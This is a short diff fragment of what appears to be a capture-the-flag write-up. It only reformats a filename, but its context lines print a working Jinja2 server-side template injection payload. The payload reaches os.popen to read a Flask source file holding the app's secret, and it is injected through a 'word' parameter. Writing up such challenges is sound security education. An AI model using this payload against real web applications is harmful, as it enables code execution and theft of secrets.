@@ -59,7 +59,7 @@ This one worked!
 
 `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat bros_site.py").read()}}{%endif%}{% endfor %}`
 
-*Note: bros_site.py, as mentioned above, contains the secret in the flask config, hence why we need to read it*
+*Note: `bros_site.py`, as mentioned above, contains the secret in the flask config, hence why we need to read it*
 
 Once injected into the `word` parameter, we get this:
 
